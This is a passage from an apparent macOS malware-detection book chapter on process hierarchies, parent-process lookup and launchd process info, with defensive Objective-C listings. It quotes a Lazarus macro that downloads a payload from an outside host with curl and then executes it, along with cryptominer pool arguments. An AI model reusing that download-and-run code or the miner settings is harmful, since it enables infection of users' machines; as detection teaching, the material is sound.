"pool.graft.hashvault.pro:3333",&#13;
"-u",&#13;
"G81Jc3KHStAWJjjBGzZKCvEnwCeRZrHkrUKji9NSDLtJ6Evhhj43DYP7dMrYczz5KYjfw&#13;
6ophndAuBKuipjpFiizVVYzeAJ",&#13;
"-p",&#13;
"qbix:greg@qbix.com",&#13;
...&#13;
)&#13;
</code></pre>&#13;
<p class="TX">It’s rather unusual for a process to be launched with such extensive arguments. Additionally, these arguments clearly allude to the fact that the process is a cryptocurrency miner. We can bolster this conclusion with the fact that its parent, <i>CalendarFree.app</i>, consumes massive amounts of CPU power, as you’ll see later in this chapter.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h3 class="H1" id="sec8"><span id="h1-11"/><span class="SANS_Futura_Std_Bold_B_11">Process Hierarchies</span></h3>&#13;
<p class="TNI"><i>Process hierarchies</i> are the relationships between processes (for example, between a parent and its children). When detecting malware, you’ll need an accurate representation of these relationships for several reasons. First, process hierarchies can help you detect initial infections. Process hierarchies can also reveal difficult-to-detect malware that is leveraging system binaries in a nefarious manner.</p>&#13;
<p class="TX">Let’s look at an example. In 2019, the Lazarus advanced persistent threat (APT) group was observed using macro-laden Office documents to target macOS users. If a user opened the document and allowed the macros to run, the code would download and execute malware known as Yort. Here is a snippet of the macro used in the attack:</p>&#13;
&#13;
<pre><code>sur = "https://nzssdm.com/assets/mt.dat"&#13;
spath = "/tmp/": i = 0&#13;
&#13;
Do&#13;
    spath = spath &amp; Chr(Int(Rnd * 26) + 97)&#13;
    i = i + 1&#13;
Loop Until i &gt; 12&#13;
spath = spath&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> res = system("curl -o " &amp; spath &amp; " " &amp; sur)&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> res = system("chmod +x " &amp; spath)&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> res = popen(spath, "r")&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_14" aria-label="14"/>As the macro code isn’t obfuscated, it is easy to understand. After downloading a file from <i>https://<wbr/>nzssdm<wbr/>.com<wbr/>/assets<wbr/>/mt<wbr/>.dat</i> to the <i>/tmp</i> directory via <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>, it sets permissions to executable <span class="CodeAnnotation" aria-label="annotation2">❷</span> and then executes the downloaded file, <i>mt.dat</i> <span class="CodeAnnotation" aria-label="annotation3">❸</span>. <a href="chapter1.xhtml#fig1-2">Figure 1-2</a> illustrates this attack from the perspective of a process hierarchy.</p>&#13;
<figure class="IMG"><img class="img7" id="fig1-2" src="../images/Figure1-2.jpg" alt="" width="950" height="1067"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 1-2: A simplified process hierarchy of a Lazarus group attack</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Although this diagram is slightly simplified (omitting forks and using symbolic values for process IDs), it accurately depicts the fact that <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">chmod</span>, and the malware all appear as child processes of Microsoft Word. Do Word documents normally spawn <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to download and launch binaries? Of course not! Even if you can’t tell what exactly these child processes are doing, the fact that an Office document spawns them is a clear indicator of an attack. Moreover, without a process hierarchy, detecting this aspect of the infection would be relatively difficult, as <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">chmod</span> are legitimate system binaries.<sup><a role="doc-noteref" id="chapter1_10" href="#chapter1-10">10</a></sup></p>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
&#13;
<h4 class="H2" id="sec9"><span id="h2-8"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Finding the Parent</span></h4>&#13;
<p class="TNI">Process hierarchies are built from the child up, through the parent, grandparent, and so on. At face value, we can easily generate a hierarchy for a given process via the <span class="SANS_TheSansMonoCd_W5Regular_11">e_ppid</span> member of its <span class="SANS_TheSansMonoCd_W5Regular_11">kp_eproc</span> structure, found in the <span class="SANS_TheSansMonoCd_W5Regular_11">kinfo_proc</span> structure. These structures, found in <i>sys/sysctl.h</i>, are shown here:</p>&#13;
&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_15" aria-label="15"/>struct kinfo_proc {&#13;
    struct  extern_proc kp_proc;    /* proc structure */&#13;
    struct  eproc {&#13;
        struct  proc* e_paddr;      /* address of proc */&#13;
        ...&#13;
        pid_t   e_ppid;             /* parent process id */&#13;
        ...&#13;
    } kp_eproc;&#13;
};&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">e_ppid</span> is the parent process ID, and we can extract it via the <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API, as in the <span class="SANS_TheSansMonoCd_W5Regular_11">getParent</span> function in the <i>enumerateProcesses</i> project (<a href="chapter1.xhtml#Lis1-10">Listing 1-10</a>).</p>&#13;
<span id="Lis1-10"/>&#13;
<pre><code>pid_t parent = -1;&#13;
&#13;
struct kinfo_proc processStruct = {0};&#13;
size_t procBufferSize = sizeof(processStruct);&#13;
&#13;
int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, processID};&#13;
&#13;
sysctl(mib, 4, &amp;processStruct, &amp;procBufferSize, NULL, 0);&#13;
parent = processStruct.kp_eproc.e_ppid;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-10: Extracting a parent’s process ID</span></p>&#13;
<p class="TX">The code first initializes various arguments, including an array with values that instruct the system to return information about a specified process. The <span class="SANS_TheSansMonoCd_W5Regular_11">sysctl</span> API will fulfill this request, returning a populated <span class="SANS_TheSansMonoCd_W5Regular_11">kinfo_proc</span> structure. We then extract the process’s parent ID from it.</p>&#13;
<p class="TX">Here is the output from <i>enumerateProcesses</i> when it encounters the instance of <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> spawned by a malicious document:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(2286):/usr/bin/curl&#13;
...&#13;
parent: /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word (2283)&#13;
</code></pre>&#13;
<p class="TX">The code was readily able to identify the parent process as Microsoft Word.</p>&#13;
<p class="TX">Unfortunately, the process hierarchies built using this <span class="SANS_TheSansMonoCd_W5Regular_11">e_ppid</span> value often aren’t this useful because the value often reports a parent process ID of <span class="SANS_TheSansMonoCd_W5Regular_11">1</span>, which maps to <i>launchd</i>, the process tasked with starting each and every process. To observe this behavior, launch an application such as Calculator via Spotlight, Finder, or the Dock. Then use the <span class="SANS_TheSansMonoCd_W5Regular_11">ps</span> utility with the <span class="SANS_TheSansMonoCd_W5Regular_11">ppid</span> command line, passing it the process’s ID. You should see that its parent ID (<span class="SANS_TheSansMonoCd_W5Regular_11">PPID</span>) is, in fact, <span class="SANS_TheSansMonoCd_W5Regular_11">1</span>:</p>&#13;
&#13;
<pre><code>% <b>ps aux</b>&#13;
USER     PID  ... COMMAND&#13;
Patrick  2726 ... /System/Applications/Calculator.app/Contents/MacOS/Calculator&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_16" aria-label="16"/>% <b>ps aux -o ppid 2726</b>&#13;
USER      PID     ...    PPID&#13;
Patrick   27264   ...    1&#13;
</code></pre>&#13;
<p class="TX">The <i>enumerateProcesses</i> utility reports the same rather unhelpful information:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator&#13;
...&#13;
parent: (1) launchd&#13;
</code></pre>&#13;
<p class="TX">Although <i>launchd</i> technically is the parent, it doesn’t give us the information we need to detect malicious activity. We’re more interested in the process <i>responsible</i> for starting the child.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
&#13;
<h4 class="H2" id="sec10"><span id="h2-9"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Returning the Process Responsible for Spawning Another</span></h4>&#13;
<p class="TNI">To return the process responsible for spawning another process, we can leverage a private Apple API, <span class="SANS_TheSansMonoCd_W5Regular_11">responsibility_get_pid_responsible_for_pid</span>. It takes a process ID and returns the parent it deems responsible for the child. Though the internals of this private API are beyond the scope of this discussion, it essentially queries the kernel, which maintains a record of the responsible parent within an internal process structure.</p>&#13;
<p class="TX">As it’s not a public API, we must dynamically resolve it using the <span class="SANS_TheSansMonoCd_W5Regular_11">dlsym</span> API. <a href="chapter1.xhtml#Lis1-11">Listing 1-11</a>, from the <span class="SANS_TheSansMonoCd_W5Regular_11">getResponsibleParent</span> function in the <i>enumerateProcesses</i> project, shows the code that implements this task.</p>&#13;
<span id="Lis1-11"/>&#13;
<pre><code>#import &lt;dlfcn.h&gt;&#13;
&#13;
pid_t getResponsibleParent(pid_t child) {&#13;
    pid_t (*getRPID)(pid_t pid) =&#13;
    dlsym(RTLD_NEXT, "responsibility_get_pid_responsible_for_pid");&#13;
    ...&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-11: Dynamically resolving a private function</span></p>&#13;
<p class="TX">This code resolves the function by name, storing the result into a function pointer named <span class="SANS_TheSansMonoCd_W5Regular_11">getRPID</span>. Because this function takes a <span class="SANS_TheSansMonoCd_W5Regular_11">pid_t</span> as its only argument and returns the responsible process ID as a <span class="SANS_TheSansMonoCd_W5Regular_11">pid_t</span> as well, you can see the function pointer declared as <span class="SANS_TheSansMonoCd_W5Regular_11">pid_t (*getRPID)(pid_t pid)</span>.</p>&#13;
<p class="TX">After checking to make sure the function was indeed found, we can invoke it via the function pointer, as shown in <a href="chapter1.xhtml#Lis1-12">Listing 1-12</a>.</p>&#13;
<span id="Lis1-12"/>&#13;
<pre><code>if(NULL != getRPID) {&#13;
    pid_t parent = getRPID(child);&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-12: Invoking a resolved function</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_17" aria-label="17"/>Now, when <i>enumerateProcesses</i> encounters a child process, such as one of Safari’s XPC Web Content renders (shown as <i>Safari Web Content</i> or <i>com.apple.WebKit.WebContent</i>), the code in <i>enumerateProcesses</i> looks up both the parent and the responsible process:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(10540)/System/Library/Frameworks/WebKit.framework/Versions/A/&#13;
XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/&#13;
com.apple.WebKit.WebContent&#13;
...&#13;
parent: (1) launchd&#13;
responsible parent: (8943) Safari&#13;
</code></pre>&#13;
<p class="TX">It accomplishes the former by checking the process’s <span class="SANS_TheSansMonoCd_W5Regular_11">e_ppid</span> and the latter by calling the <span class="SANS_TheSansMonoCd_W5Regular_11">responsibility_get_pid_responsible_for_pid</span> API. In this case, the responsible process provides more context and so is more valuable for building accurate process hierarchies.</p>&#13;
<p class="TX">Unfortunately, for user-launched applications (which could include malware), this responsible parent may simply be the process itself. To see this, launch the Calculator application by double-clicking its application icon in Finder. Then run <i>enumerateProcesses</i> once again:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator&#13;
...&#13;
parent: (1) launchd&#13;
responsible parent: (2726) Calculator&#13;
</code></pre>&#13;
<p class="TX">Rather unhelpfully, the utility identifies the responsible parent as Calculator itself. Luckily, there is one more place we can look for this information, though we must step back in time.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
&#13;
<h4 class="H2" id="sec11"><span id="h2-10"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Retrieving Information with Application Services APIs</span></h4>&#13;
<p class="TNI">Although officially deprecated, Apple’s Application Services APIs function on the latest versions of macOS, and various Apple daemons still use them. The <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessInformationCopyDictionary</span> Application Services API returns a dictionary containing a host of information, including a process’s true parent.</p>&#13;
<p class="TX">Rather than taking a process ID as an argument, this API takes a process serial number (<span class="SANS_TheSansMonoCd_W5Regular_11">psn</span>). Process serial numbers are a predecessor to the more familiar process IDs. The process serial type is <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessSerialNumber</span>, which is defined in <i>include/MacTypes.h</i>. To retrieve a process serial number from a given process ID, use the <span class="SANS_TheSansMonoCd_W5Regular_11">GetProcessForPID</span> function, as shown in <a href="chapter1.xhtml#Lis1-13">Listing 1-13</a>.</p>&#13;
<span id="Lis1-13"/>&#13;
<pre><code>#import &lt;AppKit/AppKit.h&gt;&#13;
pid_t pid = &lt;some process id&gt;;&#13;
&#13;
ProcessSerialNumber psn = {kNoProcess, kNoProcess};&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_18" aria-label="18"/>GetProcessForPID(pid, &amp;psn);&#13;
&#13;
printf("Process Serial Number (high, low): %d %d\n", psn.highLongOfPSN, psn.lowLongOfPSN);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-13: Retrieving a process’s serial number</span></p>&#13;
<p class="TX">The function takes a process ID and an out pointer to a <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessSerialNumber</span>, which it populates with the process’s serial number.</p>&#13;
<p class="TX">You can find the logic to retrieve a parent ID via a serial number in a function named <span class="SANS_TheSansMonoCd_W5Regular_11">getASParent</span> in the <i>enumerateProcesses</i> project. <a href="chapter1.xhtml#Lis1-14">Listing 1-14</a> contains a snippet of this function, which also shows it invoking the <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessInformationCopyDictionary</span> function to obtain information about the specified process.</p>&#13;
<span id="Lis1-14"/>&#13;
<pre><code>NSDictionary* processInfo = nil;&#13;
ProcessSerialNumber psn = {kNoProcess, kNoProcess};&#13;
&#13;
GetProcessForPID(pid, &amp;psn);&#13;
&#13;
processInfo = CFBridgingRelease(ProcessInformationCopyDictionary(&amp;psn,&#13;
(UInt32)kProcessDictionaryIncludeAllInformationMask));&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-14: Obtaining a process’s information dictionary</span></p>&#13;
<p class="TX">One thing to keep in mind is that older APIs that return <span class="SANS_TheSansMonoCd_W5Regular_11">CoreFoundation</span> objects do not use automatic reference counting (ARC). This means that you have to explicitly instruct the runtime on how to manage objects to avoid memory leaks. Here, this means that the returned process information dictionary from the call to <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessInformationCopyDictionary</span> must be either explicitly released via a call to <span class="SANS_TheSansMonoCd_W5Regular_11">CFRelease</span> or bridged into an <span class="SANS_TheSansMonoCd_W5Regular_11">NSDictionary</span> object and released into ARC via a call to <span class="SANS_TheSansMonoCd_W5Regular_11">CFBridgingRelease</span>. The code opts for the latter option, as working with <span class="SANS_TheSansMonoCd_W5Regular_11">NS*</span> objects is easier than working with the older <span class="SANS_TheSansMonoCd_W5Regular_11">CF*</span> objects and avoids having to explicitly free the memory.</p>&#13;
<p class="TX">After we’ve bridged the <span class="SANS_TheSansMonoCd_W5Regular_11">CFDictionaryRef</span> dictionary into an <span class="SANS_TheSansMonoCd_W5Regular_11">NSDictionary</span> object, we can directly access its key-value pairs, including the process’s parent. The parent’s process serial number is found in the <span class="SANS_TheSansMonoCd_W5Regular_11">ParentPSN</span> key. As its type is <span class="SANS_TheSansMonoCd_W5Regular_11">kCFNumberLongLong</span> (long long), you must reconstruct the process serial number manually (<a href="chapter1.xhtml#Lis1-15">Listing 1-15</a>).</p>&#13;
<span id="Lis1-15"/>&#13;
<pre><code>ProcessSerialNumber ppsn = {kNoProcess, kNoProcess};&#13;
&#13;
ppsn.lowLongOfPSN = [processInfo[@"ParentPSN"] longLongValue] &amp; 0x00000000FFFFFFFFLL;&#13;
ppsn.highLongOfPSN = ([processInfo[@"ParentPSN"] longLongValue] &gt;&gt; 32) &amp; 0x00000000FFFFFFFFLL;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-15: Reconstructing a parent’s process serial number</span></p>&#13;
<p class="TX">Once we have the parent’s process serial number, we can retrieve details about it by reinvoking the <span class="SANS_TheSansMonoCd_W5Regular_11">ProcessInformationCopyDictionary</span> API (this time, of course, with the parent’s process serial number). This provides us with its process ID, path, name, and more. Here, we’re most interested in a process ID, which we can find within a key named <span class="SANS_TheSansMonoCd_W5Regular_11">pid</span>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_19" aria-label="19"/>It’s worth noting that obtaining a process serial number will fail for system or background processes. Production code should account for this case by, for example, checking the return value of <span class="SANS_TheSansMonoCd_W5Regular_11">GetProcessForPID</span> or seeing whether the <span class="SANS_TheSansMonoCd_W5Regular_11">ParentPSN</span> key is nonexistent or contains a value of zero. Additionally, Application Services APIs should not be invoked from background processes, such as daemons or system extensions.</p>&#13;
<p class="TX">Recall that when we launched Calculator, the previously discussed methods failed to ascertain its true parent (instead returning <i>launchd</i> or itself). How does the Application Services APIs’ approach fare? First, let’s return to the instance of Calculator launched via Finder:</p>&#13;
&#13;
<pre><code>% <b>./enumerateProcesses</b>&#13;
...&#13;
(2726):/System/Applications/Calculator.app/Contents/MacOS/Calculator&#13;
...&#13;
parent: (1) launchd&#13;
responsible parent: (2726) Calculator&#13;
application services parent: (21264) Finder&#13;
</code></pre>&#13;
<p class="TX">Success! The code now correctly identifies Finder as the process that instigated the Calculator app’s launch. Similarly, if Calculator is launched via the Dock or Spotlight’s search bar, the code will be able to identify each of these as well.</p>&#13;
<p class="TX">You might be wondering why this section discussed so many different methods of determining the most useful parent of a process. This is because none of the methods are foolproof, so you’ll often need to combine them. To start, using the Application Services APIs seems to produce the most relevant results. However, calls to <span class="SANS_TheSansMonoCd_W5Regular_11">GetProcessForPID</span> can fail for certain processes. In this case, it’s wise to fall back on <span class="SANS_TheSansMonoCd_W5Regular_11">responsibility_get_pid_responsible_for_pid</span>. But, as you saw, this can sometimes return a parent that is the process itself, which isn’t helpful. In that case, you may want to fall back on the good old <span class="SANS_TheSansMonoCd_W5Regular_11">e_ppid</span>. And though that often just reports the parent as <i>launchd</i>, it works in many other cases. For example, in the Lazarus attack discussed earlier, it correctly identified Word as <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>’s parent.<sup><a role="doc-noteref" id="chapter1_11" href="#chapter1-11">11</a></sup></p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
&#13;
<h3 class="H1" id="sec12"><span id="h1-12"/><span class="SANS_Futura_Std_Bold_B_11">Environment Information</span></h3>&#13;
<p class="TNI">Now that you know how to generate a true process tree, let’s look at how to gather information about a process’s environment. You may be familiar with one way to do this: using the <span class="SANS_TheSansMonoCd_W5Regular_11">launchctl</span> utility, which has a <span class="SANS_TheSansMonoCd_W5Regular_11">procinfo</span> command line option that returns a process’s arguments, code signing information, runtime environment, and more. Though earlier we discussed other methods for gathering some of this information, <span class="SANS_TheSansMonoCd_W5Regular_11">launchctl</span> can provide an additional source and includes information unavailable through other methods.</p>&#13;
<p class="TX">Unfortunately, <span class="SANS_TheSansMonoCd_W5Regular_11">launchctl</span> is not open source, nor are its internals documented. In this section, we reverse engineer the <span class="SANS_TheSansMonoCd_W5Regular_11">procinfo</span> option and reimplement its logic in our own tools to retrieve information about any process. You’ll find this open source implementation in this chapter’s <i>procInfo</i> project.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_20" aria-label="20"/>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>The code in this section was inspired by research from Jonathan Levin.</i><sup><a role="doc-noteref" id="chapter1_12" href="#chapter1-12">12</a></sup> <i>I’ve updated his approach for newer versions of macOS.</i></p>&#13;
<p class="TX">Before we walk through the code found in the <i>procInfo</i> project, let’s summarize the approach: we have to make a call to the <span class="SANS_TheSansMonoCd_W5Regular_11">launchd</span> bootstrap pipe using the private <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_pipe_interface_routine</span> function. Invoking this function with <span class="SANS_TheSansMonoCd_W5Regular_11">ROUTINE_DUMP_PROCESS</span> (<span class="SANS_TheSansMonoCd_W5Regular_11">0x2c4</span>) and an XPC dictionary containing both the process ID of the target process and a shared-memory out buffer will return the process information you seek. The code first declares several variables needed to make the XPC query (<a href="chapter1.xhtml#Lis1-16">Listing 1-16</a>).</p>&#13;
<span id="Lis1-16"/>&#13;
<pre><code>xpc_object_t procInfoRequest = NULL;&#13;
xpc_object_t sharedMemory = NULL;&#13;
xpc_object_t __autoreleasing response = NULL;&#13;
&#13;
int result = 0;&#13;
int64_t xpcError = 0;&#13;
void* handle = NULL;&#13;
uint64_t bytesWritten = 0;&#13;
vm_address_t processInfoBuffer = 0;&#13;
&#13;
static int (*xpc_pipe_interface_routine_FP)&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> (xpc_pipe_t, int, xpc_object_t, xpc_object_t*, int) = NULL;&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> struct xpc_global_data* globalData = NULL;&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> size_t processInfoLength = 0x100000;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-16: Declaring required variables</span></p>&#13;
<p class="TX">These variables include, among others, a function pointer (which will later hold the address of the private <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_pipe_interface_routine</span>) <span class="CodeAnnotation" aria-label="annotation1">❶</span>, a pointer to a global XPC data structure <span class="CodeAnnotation" aria-label="annotation2">❷</span>, and a length extracted from reversing <span class="SANS_TheSansMonoCd_W5Regular_11">launchctl</span> <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">We then create a shared memory object via a call to the <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_shmem_create</span> API. The XPC call will populate this with information about the target process we’re querying (<a href="chapter1.xhtml#Lis1-17">Listing 1-17</a>).</p>&#13;
<span id="Lis1-17"/>&#13;
<pre><code>vm_allocate(mach_task_self(), &amp;processInfoBuffer,&#13;
processInfoLength, VM_FLAGS_ANYWHERE|VM_FLAGS_PURGABLE);&#13;
&#13;
sharedMemory = xpc_shmem_create((void*)processInfoBuffer, processInfoLength);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-17: Creating a shared memory object</span></p>&#13;
<p class="TX">Next, we create and initialize an XPC dictionary. This dictionary must contain the ID of the process we’re querying, as well as the shared memory object we’ve just created (<a href="chapter1.xhtml#Lis1-18">Listing 1-18</a>).</p>&#13;
<span id="Lis1-18"/>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_21" aria-label="21"/>pid_t pid = &lt;some process id&gt;;&#13;
procInfoRequest = xpc_dictionary_create(NULL, NULL, 0);&#13;
&#13;
xpc_dictionary_set_int64(procInfoRequest, "pid", pid);&#13;
xpc_dictionary_set_value(procInfoRequest, "shmem", sharedMemory);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-18: Initializing an XPC request dictionary</span></p>&#13;
<p class="TX">The code then retrieves a global data object of type <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_global_data*</span> from the <span class="SANS_TheSansMonoCd_W5Regular_11">os_alloc_once_table</span> array (<a href="chapter1.xhtml#Lis1-19">Listing 1-19</a>).</p>&#13;
<span id="Lis1-19"/>&#13;
<pre><code>struct xpc_global_data&#13;
{&#13;
    uint64_t a;&#13;
    uint64_t xpc_flags;&#13;
    mach_port_t task_bootstrap_port;&#13;
    xpc_object_t xpc_bootstrap_pipe;&#13;
};&#13;
&#13;
struct _os_alloc_once_s&#13;
{&#13;
    long once;&#13;
    void* ptr;&#13;
};&#13;
&#13;
extern struct _os_alloc_once_s _os_alloc_once_table[];&#13;
&#13;
globalData = (struct xpc_global_data*)_os_alloc_once_table[1].ptr;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-19: Extracting global data</span></p>&#13;
<p class="TX">This object contains an XPC pipe (<span class="SANS_TheSansMonoCd_W5Regular_11">xpc_bootstrap_pipe</span>) that is required for calls to the <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_pipe_interface_routine</span> function. Because this function is private, we must dynamically resolve it from the <i>libxpc</i> library (<a href="chapter1.xhtml#Lis1-20">Listing 1-20</a>).</p>&#13;
<span id="Lis1-20"/>&#13;
<pre><code>#import &lt;dlfcn.h&gt;&#13;
...&#13;
handle = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);&#13;
xpc_pipe_interface_routine_FP = dlsym(handle, "_xpc_pipe_interface_routine");&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-20: Resolving a function pointer</span></p>&#13;
<p class="TX">Finally, we’re prepared to make the XPC request. As noted, we use the <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_pipe_interface_routine</span> function, which takes arguments such as the XPC bootstrap pipe, a routine (such as <span class="SANS_TheSansMonoCd_W5Regular_11">ROUTINE_DUMP_PROCESS</span>), and a request dictionary containing specific routine information such as a process ID and a shared memory buffer for the routine’s output (<a href="chapter1.xhtml#Lis1-21">Listing 1-21</a>).</p>&#13;
<span id="Lis1-21"/>&#13;
<pre><code>#define ROUTINE_DUMP_PROCESS 0x2c4&#13;
&#13;
result = xpc_pipe_interface_routine_FP((__bridge xpc_pipe_t)(globalData-&gt;xpc_bootstrap_pipe),&#13;
ROUTINE_DUMP_PROCESS, procInfoRequest, &amp;response, 0x0);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-21: Requesting process information via XPC</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_22" aria-label="22"/>If this request succeeds, meaning the result is zero and the response dictionary passed into <span class="SANS_TheSansMonoCd_W5Regular_11">xpc_pipe_interface_routine</span> does not contain the key <span class="SANS_TheSansMonoCd_W5Regular_11">error</span>, then the response dictionary will contain a key-value pair with the key <span class="SANS_TheSansMonoCd_W5Regular_11">bytes -written</span>. Its value is the number of bytes written to the allocated buffer we’ve added to the shared memory object. We extract this value in <a href="chapter1.xhtml#Lis1-22">Listing 1-22</a>.</p>&#13;
<span id="Lis1-22"/>&#13;
<pre><code>bytesWritten = xpc_dictionary_get_uint64(response, "bytes-written");</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-22: Extracting the size of the response data</span></p>&#13;
<p class="TX">Now we can directly access the buffer, for example, to create a string object containing the entirety of the target process’s information (<a href="chapter1.xhtml#Lis1-23">Listing 1-23</a>).</p>&#13;
<span id="Lis1-23"/>&#13;
<pre><code>NSString* processInfo = [[NSString alloc] initWithBytes:(const void*)&#13;
processInfoBuffer length:bytesWritten encoding:NSUTF8StringEncoding];&#13;
&#13;
printf("process info (pid: %d): %s\n",&#13;
atoi(argv[1]), processInfo.description.UTF8String);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 1-23: Converting process information into a string object</span></p>&#13;
<p class="TX">Although we’ve converted this information into a string object, it’s all lumped together, so we’ll still have to manually parse relevant pieces. This process isn’t covered here, but you can consult the <i>procInfo</i> project, which extracts the data into a dictionary of key-value pairs.</p>&#13;
<p class="TX">The information returned from <i>launchd</i> contains a myriad of useful details! To illustrate this, run <i>procInfo</i> against DazzleSpy’s persistent component, which is installed as <i>~/.local/softwareupdate</i> and, in this instance, is running with a process ID of 16776:</p>&#13;
&#13;
<pre><code>% <b>./procInfo 16776</b>&#13;
process info (pid: 16776): {&#13;
    active count = 1&#13;
    path = /Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist&#13;
    state = running&#13;
&#13;
    program = /Users/User/.local/softwareupdate&#13;
    arguments = {&#13;
        /Users/User/.local/softwareupdate&#13;
        1&#13;
    }&#13;
&#13;
    inherited environment = {&#13;
        SSH_AUTH_SOCK =&gt;&#13;
        /private/tmp/com.apple.launchd.kEoOvPmtt1/Listeners&#13;
    }&#13;
&#13;
    default environment = {&#13;
        PATH =&gt; /usr/bin:/bin:/usr/sbin:/sbin&#13;
    }&#13;
    environment = {&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_23" aria-label="23"/>        XPC_SERVICE_NAME =&gt; com.apple.softwareupdate&#13;
    }&#13;
&#13;
    domain = gui/501 [100005]&#13;
    ...&#13;
    runs = 1&#13;
    pid = 16776&#13;
    immediate reason = speculative&#13;
    forks = 0&#13;
    execs = 1&#13;
&#13;
    spawn type = daemon (3)&#13;
&#13;
    properties = partial import | keepalive | runatload |&#13;
    inferred program | system service | exponential throttling&#13;
}&#13;
</code></pre>&#13;
